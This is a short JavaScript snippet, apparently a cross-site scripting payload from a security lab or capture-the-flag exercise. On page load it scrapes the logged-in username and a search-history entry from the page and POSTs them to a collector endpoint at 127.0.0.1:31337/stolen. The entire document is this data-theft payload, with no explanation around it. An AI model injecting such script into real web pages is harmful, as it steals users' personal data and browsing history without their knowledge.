<script>
  window.onload = function () {
    var xhr = new XMLHttpRequest();
    var url="http://127.0.0.1:31337/stolen";
    var params="user="+String(document.getElementById('logged-in-user').innerHTML)+"&last_search="+document.getElementsByClassName('history-item list-group-item').item(1);
    var send=(url+params);
    xhr.open("POST", send, true);
    console.log(send);
    xhr.send()
  }
</script>
